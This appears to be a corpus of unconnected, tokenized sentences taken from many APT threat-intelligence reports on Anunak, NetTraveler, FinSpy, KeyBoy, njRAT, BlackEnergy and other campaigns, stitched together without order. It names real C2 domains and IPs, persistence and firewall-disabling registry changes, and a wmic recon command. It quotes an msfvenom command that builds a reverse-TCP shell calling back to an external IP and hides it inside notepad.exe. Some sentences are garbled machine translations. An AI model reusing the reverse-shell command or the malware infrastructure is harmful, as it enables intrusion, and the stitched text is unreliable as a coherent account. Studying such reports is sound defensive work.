It also creates the following folders : % ALL USERS % /Application Data/Microsoft/Windows/123 % ALL USERS % /Application Data/Microsoft/Windows/Burn % ALL USERS % /Application Data/Microsoft/Windows/LiveUpdata_Mem It creates multiple copies of the payload including in both the Burn and LiveUpdata_Mem folders .
Malicious attachments with this template all use a similar dropper which originally drops the payload to the temporary file directory .
Figure 2 : Encrypted data in XC key Figure 3 : Decrypted data ( note : e0 25 is 0x25e0 which is 9696 in hex ) We have seen a large number of similar samples sent to Tibetan groups that use the same stage two ( GmRemote ) and communicate with the following C2s : dtl.dnsd.me , dtl.eatuo.com , dtl6.mooo.com and tbwm.wlyf.org .
The window screenshot is shown in the figure below : When the attackers gain access to servers running operating systems of the Linux family they use SSH backdoor that transmits to the malicious server the login/password data used to access the servers and provides attackers remote access to the servers .
Ammy Admin was used for remote access , the same SSHD backdoor was installed on Unix servers and , In addi- tion , it was loaded from the same hacked server as in other cases of trojan Anunak usage .
To find interesting infections within this large set of compromised systems , the malware extracts relevant information from the systems including Microsoft Windows organization registration information and network/ Windows domain information .
The Anunak malware has multiple ways of connecting to backends , which includes a PHP based backend reachable over HTTP and HTTPS , and a Windows server based component using a propri- etary protocol .
The attackers use BITS to download files , but also make use of Windows built-in PowerShell to download tools and execute commands .
Targets include government , military , and civilian organizations Spear phishing to carefully-selected target individuals was the primary attack vector identified in the investigation .
Often the user would be presented with a legitimate document or software download they were expecting to see , along with an unseen malicious download .
Operation Hangover utilizes a very extensive and sophisticated command-and- control infrastructure , likely developed over many months or years by numer- ous developers .
The primary purpose of this long-running , global command-and-control net- work appears to be surveillance against national security interests .
Victims would click on what appeared to be an interesting docu- ment , and begin the long-running infection cycle .
If the recipient falls for the scam , Trojan horse , remote access tool ( RAT ) software is installed on the victim 's computer that can give the attacker keystrokes , screenshots , microphone and webcam recordings , stolen documents , and passwords .
To compromise its targets , the SEA often sends socially engineered , spear-phishing emails to lure opposition activists into opening fraudulent , weaponized , and malicious documents .
And to make matters worse , compromised systems are used as staging grounds for further attacks on regional targets , by installing illicit command-and-control ( CnC ) servers , abusing legitimate email accounts , and disseminating stolen office documents as `` bait .
For example , its payload can arrive at its destination encrypted-and become decrypted and installed only on a target device .
'' FireEye researchers have seen a heavy use of spear phishing and the construction of a `` watering hole , '' in which an important website is hacked in the hope of compromising the computers of its subsequent visitors , who usually belong to a certain VIP-profile the attacker is targeting .
The functionality of the dropper can be summarized in the following steps : • Sandbox check and anti virus product enumeration • Dropping payload 'netmgr.exe' • Creating a registry key for persistence • Creating a registry key for deletion of the dropper Searching for a sandbox environment , the malware takes a number of simple steps to verify .
For stealthiness the malware can either inject itself as a remote thread to a running svchost.exe process or perform the same procedure on a newly created one .
Furthermore , the dropper generates another entry in the Windows registry , under [ HKLM| HKCU ] \Software\Microsoft\IPSec .
All data exchanged with any of the C & C servers as well as data stored to a file on disk is encrypted with the according key .
The work flow for each hearer per execution loop in the main thread is as follows : • Read and decrypt content from according net.cap-file • See if an entry of the C & C command list can be found in the decrypted data • If so , execute the command • Hand the data over to the Lua interpreter thread • See if a Lua script can be located , searching for start and end sentinel • If so , start Lua thread and execute script • If more than one script can be found start more Lua threads recursively After starting the Lua thread requests a value from Windows registry named 'EnableLua' under SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System .
Here are some screenshots of the administration interface : Figure 14 : Terminator : List of processes on the infected machine Figure 15 : Terminator : List of opened ports on the infected machine Figure 16 : Terminator : Remote shell on the infected machine Figure 17 : Terminator : Registry access to the infected machine Figure 18 : Terminator : Services management on the infected machine Figure 19 : Terminator : Information about the infected machine Figure 20 : Terminator : Installed software on the infected machine 5.4 Scanner We decided to create a scanner to identify the servers which were running Terminator .
1.5 Document structure This document is structured in the following way :  Chapter 2 deals with the information gathering phase ;  Chapter 3 describes the malware Poison Ivy and a vulnerability of it ;  Chapter 4 is a static analysis of samples ;  Chapter 5 deals with the information we gathered on the attacked command & control ;  Chapter 6 introduces an homemade RAT called terminator ; 2.1 Command & Control scanner In the Mandiant report , it is explained that the attacker used a well-known Remote Administration Tool ( RAT ) called Poison Ivy .
5.5 Remote code execution vulnerability After a full analysis of the communication protocol , we identified a vulnerability in the Command & Control executable : The server does not correctly parse the data sent by the infected machine .
3.1 Description Poison Ivy is a Remote Administration Tool ( RAT ) available here : http : //www.poisonivy- rat.com/index.php ? link=download .
We concluded that the Poison Ivy daemon was hidden behind a proxy server , by using port forwarding to hide the real IP of the command & control server .
The builder for BlackWorm v0.3.0 is fairly simple and allows for very quick payload , but does n't allow any configuration other than the IP address for command and control ( C2 ) .
BlackWorm v2.1 has the same abilities as the original version and additional functionality , including bypassing UAC , disabling host firewalls and spreading over network shares .
Configuration options within code The malware communicated out to 178.44.115.196 , over port 5050 , with a command structure of : ! 0/j|n\12121212_64F3BF1F/j|n\ { Hostname } /j|n\ { Username } /j|n\USA/j|n\Win 7 Professional SP1 x86/j|n\No/j|n\2.4.0 [ Dark Edition ] /j|n\/j|n\ { ActiveWindowName } /j|n\ [ endof ] When looking at samples of Dark Edition BlackWorm being used by the Syrian Malware Team , the strings '' Syrian Malware , '' or `` Syrian Malware Team '' are often used in the C2 communications or within the binary strings .
! 1/j|n\C : \Documents and Settings\ { Username } \Local Settings\Application DataldoDrZdpkK.jpg – Windows Internet Explorer [ endof ] ! 0/j|n\Syrian Malware/j|n\ { Hostname } /j|n\ { Username } /j|n\USA/j|n\Win XP ProfessionalSP2 x86/j|n\No/j|n\0.1/j|n\/j|n\C : \Documents and Settings\ { Username } \Local Settings\Application DataldoDrZdpkK.jpg – { ActiveWindowName } /j|n\ [ endof ] Determining which groups use which malware is often very difficult .
E.exe , ( MD5 : a8cf815c3800202d448d035300985dc7 ) a binary that drew our attention , looked to be a backdoor with the Syrian Malware strings within it .
The downloaded file is actually the Stealer malware that exfiltrates stolen data to an FTP server .
The page is used to steal legitimate credentials , but once users enter the credentials , they are often redirected to a new page that prompts them to download a `` Browser Patch '' or other similar type of file .
The following Yara rules will provide detection for the adversary remote access toolkit and exfiltration tool : You can use this rule with CrowdStrike 's free CrowdResponse tool to easily scan your systems for presence of FLYING KITTEN .
The website does not appear to deliver any malware , so its most likely purpose is to act as a credential-collection mechanism much like the spoofed Institute of Electrical and Electronics Engineers ( IEEE ) Aerospace Conference website ( aeroconf2014 [ .
For example , the adversary will register a domain that spoofs the name of the targeted organization and then host a spoofed login page on that site .
e. Download backdoor : Downloads dropper file pao.exe from http : //www.hisunpharm.com/files/File/product/ and stores it to C : \Program Files\tongji2.exe f. Drops and execute batch file : schedules downloader every 30 minutes and ensures svchest.exe is started with Local System privileges .
The attackers compromised the server and created a Trojan that would be downloaded to user computers during a routine update .
During this time attackers used C & C servers to monitor the activities on the infected machines and uploaded tools on a previously compromised legitimate Taiwanese website .
Command & control ( C & C ) : Using a simple XOR loop for encryption , the malware attempts to connect to laoding521.eicp.net over port 889 to communicate with the attackers .
A vast array of components was implemented in the malware including four 0-Day exploits , a windows rootkit , antivirus evasion techniques , complex process injection and hooking code , network infection routines , peer-to-peer updates , a command and control interface , as well as the first ever PLC rootkit .
Just like Bahraini samples , the malware relocates itself and drops a JPG image with the same filename as the sample when executed by an unsuspecting user .
An in-depth analysis of the FinSpy Mobile suite of backdoors was provided in an earlier blog post : The Smartphone Who Loved Me : FinFisher Goes Mobile ? The sample included a configuration file that indicates available functionality , and the options that have been enabled by those deploying it : Interestingly , the configuration file also specifies a Vietnamese phone number used for SMS based command and control : The command and control server is in a range provided by the CMC Telecom Infrastructure Company in Hanoi : This server was active until very recently and matched our signatures for a FinSpy command and control server .
The attachments we analyzed sent data to a command & control server inside Bahrain .
This post adds to the list by providing an updated list of FinSpy Command & Control servers , and describing the FinSpy malware samples in the wild which appear to have been used to target victims in Ethiopia and Vietnam .
The malware communicates with a FinSpy Command & Control server in Ethiopia , which was first identified by Rapid7 in August 2012 .
The screenshot below reveals that the actual file behind this shortcut points to a different program : conime.exe : The `` Cohhoc '' malware is a Remote Administration Tool and is able to :  execute commands or scripts ;  download files ;  upload files ;  collect information about the infected system , for example hostname , username , version of the operating system , installed software ;  find specific documents in order to send them to the command and control servers .
Within the samples , we found two different hardcoded command and control servers and a feature to easily choose an alternative server .
The tool allows the attackers :  to execute code on the infected system ;  to download files ;  to get information about the infected system ;  to steal data such as Office documents or media files .
The following tag , inside the document , reveals this function : As soon as the document is loaded , a network query is performed and notifies the attacker about the successful exploit and the availability of a newly infected machine .
If the processes are not running on the infected system , the injection is performed into explorer.exe .
The comment includes a punchy message for `` kasperRsky '' : Killint.tcl – uses Ciscoapi.tcl , implements destroying functions : The script tries to download ciscoapi.tcl from a certain FTP server which served as a storage for BE2 files .
The config files within BE2 contained the settings of the company 's internal web proxy : As the APT-specific BE2 now stores the downloaded plugins in encrypted files on the system ( not seen in older versions – all plugins were only in-memory ) , the administrators were able to collect BE2 files from the infected machines .
Kaspersky Lab detects 'BlackEnergy3 ' malware as Backdoor.Win32.Fonten – naming it after its dropped file `` FONTCACHE.DAT '' When investigating computers in the company 's network , only BE2 associated files were found , suggesting BE3 was used as only a first-stage tool on this network .
After decrypting these files , we could retrieve plugins launched on infected machines : ps , vsnet , fs , ss , dstr .
The 'vsnet ' plugin was intended to spread and launch a payload ( BlackEnergy2 dropper itself at the moment ) in the local network by using PsExec , as well as gaining primary information on the user 's computer and network .
Any communication with them must be considered extremely suspicious java.serveblog.net agaliarept.com frejabe.com grannegral.com plushbr.com xmailliwx.com blogwhereyou.com ( sinkholed by Kaspersky Lab ) grannegral.com ( sinkholed by Kaspersky Lab ) Creates the file Java Update.lnk pointing to appdata/Jre6/java.exe Malware is installed in appdata/ MicroDes/ Running processes Creates Task Microsoft_up The first evidence is the language used , both for the victims and attackers , is Spanish .
The malware is distributed via social engineering techniques , which includes spear-phishing emails and infections via Web by a fake Blog website .
The malware is capable of the following cyber-espionage operations : Logging keystrokes Capturing audio from the computer 's microphone Capturing screenshots Capturing geolocation data Taking photos from the computer 's web camera Copying files to a remote server Copying files to a special USB device if inserted Hijjacking the clipboard and capturing information from the target machine Most of the victims are located in , Venezuela , Ecuador , Colombia , Peru , Russia , Cuba , and Spain , among others .
During this investigation , we also discovered many other the files installing this cyber-espionage tool in what appears to be a dedicated a spear phishing campaign .
These are the names of the PowerPoint attachments : Hermosa XXX.pps.rar Suntzu.rar El arte de la guerra.rar Hot brazilian XXX.rar These files are in reality Nullsoft Installer self-extracting archives and have compilation dates going back to 2008 .
The encrypted commands that are accepted are : Sleep : Commands the backdoor to sleep for specified number of minutes We have received a sleep command of `` sleep:120 '' during our analysis which means that the malware will wait for 2hrs before establishing a connection again to the C & C server Download : < download_url > Commands the backdoor to download and execute a file ( most probably another Win32 executable ) from a specified URL The C & C servers used in this campaign are found to be newly registered and also short-lived , making it difficult for us to track the malware 's behavior .
'' Listed below are the backdoor commands we were able to see from our analysis : Variant 1 `` run1 '' – open a remote shell `` run2 '' – pipe shell commands from URL1 `` run3 '' – pipe shell commands from URL2 `` http '' – pipe shell commands from C2 `` x_ '' – sleep for specified number of minutes Variant 2 `` sleep : '' – sleep for specified number of minutes `` download : '' – download and execute another executable from C2 Attribution Attribution of campaigns and attack methods can often be difficult .
When executed , it drops and opens a valid PDF file , which was most probably taken from the target organization 's website .
This sample drops the file UIODsevr.exe , its backdoor component which behaves similarly as BKDR_SLOTH.B with the addition of communicating to its C & C at skys { BLOCKED } com .
The Siesta Campaign : A Case Study We are currently investigating an incident that involved attackers sending out spear-phishing emails addressed to executives of an undisclosed company .
So , the dropper creates three files in the C : WindowsSystem32 directory : netsvcs.exe - the modified Team Viewer client ; netsvcs_ko.dll - resources library of Team Viewer client ; vcmon.exe - installer/starter ; and creates the service `` Remote Access Service '' , adjusted to execute C : WindowsSystem32vcmon.exe at system startup .
Besides the basic library ( KBDLV2.DLL / AUTO.DLL ) that is responsible for common communication with its campaign master , we were able to find modules performing the following functions : Keystroke logging Directory listing collection HWP document theft Remote control download and execution Remote control access At system startup , the basic library disables the system firewall and any AhnLab firewall ( a South Korean security product vendor ) by zeroing out related values in registry : SYSTEMCurrentControlSetServicesSharedAccessParameters FirewallPolicyStandardProfile EnableFirewall = 0 SYSTEMCurrentControlSetServicesSharedAccessParameters FirewallPolicyPublicProfile EnableFirewall = 0 HKLMSOFTWAREAhnLabV3IS2007InternetSec FWRunMode = 0 HKLMSOFTWAREAhnlabV3IS80is fwmode = 0 It also turns off the Windows Security Center service to prevent alerting the user about the disabled firewall .
It is interesting that the module does not search for all the HWP files on infected computer , but reacts only to those that are opened by the user and steals them .
After sending , the malware executes the real Hangul word processing application `` Hwp.exe '' to open the .HWP
In any case , be it Windows 7 or not , this malicious code decrypts its spying library from resources , saves it to disk with an apparently random but hardcoded name , for example , ~DFE8B437DD7C417A6D.TMP , in the user 's temporary folder and loads this file as library .
 Abuse of Code Signing infrastructure to validly sign custom backdoor malware ;  Exploiting systems using different SETHC.exe methods accessible via Remote Desktop Protocol ( RDP ) ;  Long history of IP/DNS telemetry allowing for historical research and link analysis ;  Placement of malicious proxy tools introduced into the environment on Windows server based proxies to bypass proxy logging ;  Extensive use of time/date stomping of malicious files to hinder forensic analysis ; and  Malware leveraging compromised credentials to bypass authentication NTLM proxies ( proxy aware ) .
Furthermore , this Trojan also drops a driver file on the system named : { 93144EB0-8E3E-4591-B307-8EEBFE7DB28F } .sys
Web shells are files containing malicious code written in various Web scripting languages , such as JSP , CFM , ASP , ASPX , or PHP , that when hosted on a publicly accessible Web site allow an adversary such as Shell_Crew to gain remote access and perform various unauthorized activities on a compromised system and network .
The client Trojan service sends the password after obfuscating it with a 4-byte XOR key , which is dynamically generated and sent with the rest of the data .
In addition to traditional Trojans that beacon out to a destination IP address , this adversary has also been observed utilizing the following entrenchment techniques ;  Installation of Web shells ;  Registering DLLs with Internet Information Services ( IIS ) ;  Modifying the 'System.Web.dll ' file ;  Trojan.Derusbi ; and  Utilizing the RDP backdoor 'sethc.exe ' .
The backdoor connects to the following C2 for instructions : news [ dot ] grouptumbler [ dot ] com/news/feed.php IP : 200.63.46.23 It supports several commands , such as copy file , move file , remove file , make directory , kill process and of course , download and execute new malware .
To gain control at boot , it writes a randomly named LNK file to the startup folder , which in turn calls the main body using rundll32 : In the picture above , the malware 's main body is stored as `` stat.bin '' ( a randomly selected name ) in the `` Adobe '' folder .
The encrypted `` uri ! '' holds a different c2 for each version of the malware : It 's most likely that these websites have been hacked by the attackers and injected with the command and control PHP script .
While we were analyzing the samples , the attackers connected to the C2 and added a custom backdoor as `` 1109821546.gif '' : `` http : //tsoftonline.com/views/img/1109821546.gif '' HTTP/1.1 200 OK Date : Mon , 25 Feb 2013 12:34:13 GMT Server : Apache Last-Modified : Mon , 25 Feb 2013 10:59:49 GMT ETag : `` 7c8251-5190d-4d68a708d9340 '' Accept-Ranges : bytes Content-Length : 334093 Content-Type : image/gif This custom backdoor , referred to as `` stage 3 '' , is much bigger than the previous ones – 300K+ in size .
Here 's what one of these GIF files looks like : Here 's one example of a malicious request for the C2 domain `` arabooks*dot+ch '' : arabooks.ch/lib/index.php ? ia=TJ2b7uzMuh4fnt2n7aJisckAj6pEvkLPPsmk5gC77rPeYKmj8z58UWS1szY0FGzkp [ REMOVED ] lhUDx vzo1_IpYHfDI2MTg2NTM5OTF8MS4xMw== The picture from the GIF file is actually very small and reminds us of the method used by Duqu back in 2011 to hide data , known as 'steganography ' : At offset 0x6a4 inside the GIF file , there is a hidden encrypted PE file .
Attackers often use publicly available RATs like Gh0st , PoisonIvy , Hupigon , and DRAT , and `` closed-released '' RATs like MFC Hunter and PlugX.1 However , the network traffic these RATs produce is well-known and easily detectable although attackers still successfully use them.2 Attackers always look for ways to blend their malicious traffic with legitimate traffic to avoid detection .
It then adds the following registry entry to enable its automatic execution at every system startup : HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\ Windows\CurrentVersion\policies\Explorer\run tpbar = `` % System % \tpframe.exe '' The network traffic the malware produces is designed to look like Windows Messenger traffic .
Attackers often use remote access Trojans ( RATs ) , which typically have graphical user interfaces ( GUIs ) and remote desktop features that include directory browsing , file transfer , and the ability to take screenshots and activate the microphone and web camera of a compromised computer .
All three versions of the FAKEM RAT that we investigated were distributed via spear-phishing emails using social engineering to lure targets into executing a malicious attachment .
file packed with UPX is dropped.6 After initially dropping the malicious file named hkcmd.exe to the % Temp % folder , the malware typically copies itself using the name , tpframe.exe , to the % System % folder .
As shown in Figure 1 , the adversary sends a malicious Word document , `` 103.doc '' ( md5 : a130b2e578d82409021b3c9ceda657b7 ) , that exploits CVE-2012-0158 , which subsequently drops a malware installer named `` DW20.exe '' .
The malware connected to the same command and control server , liumingzhen.zapto.org , but the callback is quite different : XYZ /WinData.DLL ? HELO-STX-1*1 [ IP Address ] * [ Computer Name ] *0605 [ MAC : [ Mac Address ] ] $ In a separate case where liumingzhen.zapto.org has been used as the command and control server , the payload was neither WinData nor Terminator RAT , but another type of malware known as Protux .
The sample we analyzed ( md5 : 50d5e73ff8a0693ed2ee2d320af3b304 ) exploits CVE-2012-0158 and has the following command and control server : catlovers.25u.com / 123.51.208.142 The command and control servers for both samples resolved to IP addresses in the same class C network .
The RAT ( svchost_.exe ) will collaborate with its relay ( sss.exe ) to communicate with the command and control server .
This folder `` 2019 '' was then configured to be the new start up folder location by changing the registry '' HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\Startup '' with the location of its path ( see Figure 2 ) .
This module installed with Teamviewer 6 allows the attackers to access computer desktop remotely , activate webcam or microphone , download or upload files to the infected machine and many more .
After that it will connect to the Command and Control ( C2 ) server and fetch updated modules by the following URLs : http : // < server name > / < filename > , where < server name > is a value from tv.cfg file ( newslite.org ) .
This functions when it is executed the first time has a trigger to start a couple of new threads that communicate with C2 server to ping it and get commands via HTTP GET request using parameters specified in tv.cfg : http : // < server > /tv/getinfo.php ? id= ...
The tool has internal code in the log file : 01.01.01 The main procedures starts from generating output file path and creating the corresponding file : % SYSTEMDRIVE % \ProgramData\Adobe\AdobeArm\sysdll2.txt After that the code iterates through all available logical drives and searches for the files matching the following patterns : Information about discovered files will be saved in a temporary file created in % TEMP % folder and after the search is finished it will be copied to the following file : The temporary file name is created using GetTempFileNameA system API , which creates a temp file name of the following format : < uuuu > .TMP
The module concatenates a string to run a command with cmd.exe : cmd.exe /c wmic os get /format : HFORM > % SYSTEMDRIVE % \ProgramData\Adobe\AdobeArm\sysdll155.html & & wmic bios list /format : HFORM > > % SYSTEMDRIVE % \ProgramData\Adobe\AdobeArm\sysdll155.html Execution of the commands above concatenates two HTML reports which contain two tables with information about running OS and computer 's BIOS .
This executable is a `` loader '' that contains the process debugging ( PDB ) string : Upon execution , the loader drops another executable `` ie.exe '' ( 277487587ae9c11d7f4bd5336275a906 ) that contains the following PDB string : This executable has a compile date of 2013/07/25 and BS2005 is the most recent iteration of the backdoor .
This malware is known as BMW , due to the presence of this PDB string : BMW sample ( 649691e1d367721f0ff899fd31133915 ) beacons to CnC mail.yahoo.sendsmtp.com with the following fake HTTP traffic : The < filename > in the URI is randomly chosen from one of the following hard-coded entries within the malware binary : • acheb.aspx • bajree.aspx • cyacrin.aspx • dauber.aspx • eaves.aspx The Base64 encoded data in the POST body decodes to the following : The < Y/N > data indicates whether the malware is running inside a virtual machine .
* They then checked the RAR archive , uploaded it to the CnC server , and deleted the archive from the compromised system : • dir % temp % /tem.rar • del C : \DOCUME~1\ [ REDACTED ] \ [ REDACTED ] \Temp\tem.rar During our window of visibility , FireEye found evidence that the attackers were able to enumerate the various target networks , move laterally to compromise new systems , and finally to gather information that was compressed and uploaded to the CnC server .
When FireEye had visibility on the CnC server , we saw the attackers engage in post-compromise information gathering and lateral movement on the target network , where upon FireEye immediately contacted the relevant authorities and began the notification process .
The network communication is actually performed through the browser process , causing some misdirection when it comes to determining which process is ultimately responsible for generating this network traffic .
The `` msfvenom '' tool transmogrifies a Metasploit payload into a standalone EXE , and with the `` -x '' switch , it 'll fuse the payload- -encoded as desired -- into a copy of an existing executable , exhibiting exactly the behavior we just described .
The files in question were found in a dim and dusty directory on a forlorn FTP server in the US , commingled with the detritus of past attack campaigns and successful compromises .
Something along the lines of `` msfvenom -x notepad.exe -p windows/shell/reverse_tcp -e x86/shikata_ga_nai -i 5 LHOST=108.175.152.230 LPORT=12345 > Notepad4.exe '' .
One conclusion Brian proposed is that they 're intended as backdoors -- replacements for the legitimate Notepad on a compromised system -- which would enable Cleaver to regain access to a system at some indeterminate time in the future , the next time a user runs Notepad .
) Here is its behavior summarized as function calls : The above is known to be true for Notepad3.exe , Notepad4.exe , and notepad10.exe .
If the malware failed to locate the proxy server it unregisters current malicious service by deleting corresponding registry keys in HKLM\System\ CurrentControlSet\ < servicename > \ and at- tempts to delete all related files from the fol- lowing list : Otherwise , if the proxy was checked successful- ly the malware writes the following value to the config file ( config_t.dat ) : After that the module sleeps for 60 seconds and starts a new thread ( see below Thread1 ) , sleeps 10 more seconds and creates another thread ( see below Thread2 ) .
The exploit drops > > % temp % \netmgr.dll > > % temp % \netmgr.exe > > % temp % \perf2012.ini > > % temp % \sysinfo2012.dll > > % temp % \winlogin.exe The malware command and control server script is at `` hxxp : //www.faceboak.net/2012nt/ nettraveler.asp '' .
The module main purpose is to install and embedded DLL file or load it during system startup .
Thread1 ( Command and Control Thread ) This thread starts from collecting local system information , including the following : This information is stored in a text buffer with Chinese comments like shown below ( transla- tion is added in red ) : Physical Memory : Total physical memory : ***MB of available memory : ***MB ( ** .
The data is transferred to the command and control servers via HTTP requests such as : Note : for our analysis of the Red October cam- paign , see : https : //www.securelist.com/en/ blog/785/The_Red_October_Campaign_An_ Advanced_Cyber_Espionage_Network_Target- ing_Diplomatic_and_Government_Agencies During our analysis of NetTraveler infections , we identified several victims that were infected both by NetTraveler and Red October .
After a command and control message is received , OrcaRAT sends an HTTP POST message back to the command and control server .
Once all of the values have been encrypted and formatted the URI has the following structure : ( A screenshot showing the URI structure of OrcaRAT command and control activity ) The campaign ID value is constructed using a method similar to that for the encryption key .
Given the command structure above , it is logical to assume that the command and control server requires an operator to manually issue specific commands to the victim workstation , with the default command likely being 'sleep ' .
Each branch of command and control activity is determined by the unique response from the remote server .
We will now investigate the mechanisms that the server uses to communicate and interact with the victim .
After the configuration file is written , it checks if the malware was previously installed or not , if not , it creates a dynamic-link library in the `` system32 '' folder , creates a temporary batch file named as `` temp.bat '' which installs the previous DLL as a service on the system .
The name of the DLL that is created , is based upon the values of the data from `` netsvcs '' from the following registry key : `` HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost '' .
Next step is to compress the contents of this file , copy the compressed content to a new file named as `` AllIndex.ini_d '' & then delete the previously created clear-text file .
Now , as we know already , this DLL was installed as a service by the previous dropper .
Another important aspect of Travnet is the fact that it uses a custom compression & encoding algorithm on the data collected , before its sent to the remote C & C .
- The Wired AutoConfig ( dot3svc ) service is responsible for Performing IEEE 802.1X - The WLANSVC service Logic Provides the Required to Configure , Discover , Connect to , and disconnect from a Wireless local Area network .
- Creates and maintains client network connections to remote server using the SMB protocol MBR destruction is done through a 'number ' value of the registry key value of the items checked below ( `` 0 '' if the destructive behavior than the largest value ) is set to '0 ' value at the time of initial infection .
MD5 and V3 diagnostic information on malicious files identified vulnerability Hangul file and generated by the current is as follows .
% System % registered the generated DLL as a service to the folder / drive upon , information that is used has a list on the inside of malicious code , and select one of the items below at random .
The following [ Figure 4 ] is overwritten with the contents of the MBR code , and has the ability to output the string during boot `` Who Am I ? '' .
If the request and the Via field exist , the server variant authenticates the client and responds with HTTP/1.0 200 Server : Apache/2.2.3 ( Red Hat ) Accept-Ranges : bytes Content-Type : text/html Proxy-Connection : keep-alive If the client 's request does not meet the appropriate authentication criteria , the server variant sends : HTTP/1.0 400 Bad Request Server : Apache/2.2.3 ( Red Hat ) Connection : close With a communication channel between the server variant and the client established , the server sends information about the victim 's computer .
PCC_FILE : :ProcessPacketEx performs no file management operations but instead adds any incoming command packets to a queue for processing by PCC_FILE : :ReadWaitingData if the packet is not already within the queue ( thus avoiding duplication of commands ) .
The server variant utilizes a device driver in order to hook into the Windows firewall by either using largely undocumented Windows Firewall hooking techniques found in Windows XP and older or by using the documented Windows Filtering Platform found in Windows Vista and later .
Failing this , the mainLoop determines if the victim 's machine is running the 360 antivirus product by looking for a process with the name ZhuDongFangYu.exe .
The binary then spawns a new thread that contains the main server variant code in order to allow the DllEntryPoint routine to return to the calling function .
Based on this , the malware has likely modified the system registry on the compromised computers in such a way that the RAT gets executed as a service by the trusted process 'svchost.exe ' each time the computer is started .
After sending the detailed beacon to the command and control server , the compromised computer appeared to expect a response from the server .
Optional features include encrypted file search , an SMS notification service , and functionality that enables the compromised computer to be used as part of a botnet to send spam or to conduct distributed denial of service attacks .
X­Shell configuration webpages contain , in encoded form , a colon­separated IP address ( or callback domain ) and port for the malware to use to communicate with its C2 server .
It provides options to digitally sign the malware , specify its connection mode ( connect/listen/sniff ) , install the malware in one of several covert manners , recover the System Service Dispatch Table ( SSDT ) before installation , and abort installation if a virtual machine is detected .
Cross-Platform Frutas RAT Builder and Back Door , Feb 2013 : http : //www.symantec.com/connect/blogs/cross-platform-frutas-rat-builder-and-back-door 6 .
It has some of the following capabilities : In the past , variants of the DarkComet and AcromRAT malware have also been observed beaconing to the same Command & Control ( CnC ) servers used by the Unrecom RAT in this campaign .
These backdoors provide a persistent foothold , using a separate command and control channel ; allowing future access less likely to be correlated to the original activity .
DarkComet RAT - It is the END ! , Jul 2012 : http : //www.symantec.com/connect/blogs/darkcomet-rat-it-end 8 .
One simple example of how the emails in this phishing campaign are related is that the Command and Control node ( 184.22.201 [ .
Following are the hashes of the exploit file : THAM luan- GD- NCKH2.doc When executed the exploit initially creates and launches a dropper at location % Temp % \svchost.exe with the following hashes : svchost.exe This payload then creates a DLL file in system32 called CREDRIVER.dll , which is in fact the actual backdoor : CREDRIVER.dll We also identified another document exploiting CVE-2012-0158 , but this time apparently targeting some Indian individuals .
Firstly , thanks to the fixed patterns used by the malware in the authentication procedure , we can detect outbound traffic from infected hosts with the following simple Snort rule : alert tcp $ HOME_NET any - > $ EXTERNAL_NET any ( msg : '' KeyBoy Backdoor Login '' ; flow : to_server ; content : '' |c4 4c 87 3f 11 1e c4 1a| '' ; depth:8 ; sid:1000001 ; rev:1 ; classtype : trojan-activity ; reference : url , community.rapid7.com/community/infosec/blog/2013/06/07/keyboy-tar geted-attacks- against-vietnam-and-india ) The simplest way to identify an infection on a given Windows system , is just to look for the existence of the file C : \WINDOWS\system32\CREDRIVER.dll or of a service called MdAdum .
You can easily decode the content of the payload with the following Python snippet : The previous packet decodes to the following : $ login $ LAB 192.168.56.101 MyUser 2013/06/06 23:56:24 Proxy 20130401 While reverse engineering the backdoor we noticed that the malware expects the following messages from the C & C server it contacts : Sysinfo FileManager Download UploadFileOk Shell Intrigued by its capabilities , we started reconstructing the communication protocol and practically building a tool that would operate just like the original controller used by the attackers .
As mentioned , when the exploit is opened a dropper is created and launched , which then takes care of creating a Windows service called MdAdum , which is then visible in the registry as follows : The dropper then launches the service with the DLL located at C : \WINDOWS\system32\CREDRIVER.dll and deletes itself .
Most interestingly the command Shell spawns a Windows command shell that we can control remotely : shell > Shell $ shell $ Microsoft Windows XP [ Version 5.1.2600 ] ( C ) Copyright 1985-2001 Microsoft Corp. C : \WINDOWS\system32 > shell > tasklist $ shell $ tasklist $ shell $ C : \WINDOWS\system32 > While the interaction with the bots could also be scripted , it might be plausible that the operators of these intrusions might be interacting with their targets exclusively manually to collect different data depending on each individual they infected and the goals they had set for the attack .
Reactor ( http : //www.eziriz.com/ ) This document provides details of the njRAT campaign codes used , versions , ports , and CnC nodes currently observed sending commands to victim systems .
`` njRAT '' is a robust remote access trojan ( RAT ) which upon reaching and infecting an end-point , allows the attacker to have full control over the victim system .
To this day , we continue to observe waves of blunt phishing attacks from compromised hosts in the Middle East , showing threat actors using multiple tools ( including njRAT , AdwindRAT , Xtreme RAT , and H-Worm ) in clustered phishing attacks against the same targets .
Among other things , with this access , the attacker could start scanning other systems in the victim network to perform lateral movement .
Additionally , we continue to directly observe significant activity from threat actors sending commands to the victim systems in the Middle East .
The round-trip time between the client and server can be estimated by measuring the time from when the client sends it initial TCP SYN packet to when it receives a TCP SYN+ACK from the server .
Our network forensic analysis was performed by investigating the following to packet capture files : The analyzed capture files contain pure IPv6 traffic ( CERNET is a IPv6 network ) which made the analysis a bit different then usual .
The evidence we 've observed instead indicate that the MITM attack is performed either by performing IP hijacking or by simply reconfiguring a router to forward the HTTPS traffic to a transparent SSL proxy .
An alternative to changing the router config would also be to add an in-line device that redirects the desired traffic to the SSL proxy .
Even though the machine performing the MITM was very quick at performing the TCP tree-way handshake we noticed that the application layer communication was terribly slow .
) When the DLL first runs , it installs itself permanently into two places on the victim 's computer : • C : \Documents and Settings\All Users\Application Data\Microsoft\ Windows\Burn\ % COMPUTERNAME % .dll
This component decodes the Command-and-Control ( C & C ) server names that the final malware will use , and saves them to the registry entry HKCU\Software\ Microsoft\Windows Media\XC .
After infecting your computer , the shellcode loads a new copy of Word to display a decoy document that is hidden inside the malicious file .
• Shellcode is runnable program code delivered inside a file that is supposed to be plain data , and therefore implicitly safe , but that can be executed without the user 's knowledge or consent by exploiting a vulnerability .
Fig 5 : Smoaler registry entry used to store C & C server names After storing the C & C names in the registry , the intermediate infector loads the dropped DLL using the LoadLibrary ( ) Windows API call .
The downloaded `` JPG '' file was analyzed to be a backdoor in the victim 's machine .
This backdoor provides the attacker the flexibility on how malicious activities could be executed .
Interestingly , we have found another spear phishing document that downloads malware which incorporates improved mouse click detection anti- sandboxing capability .
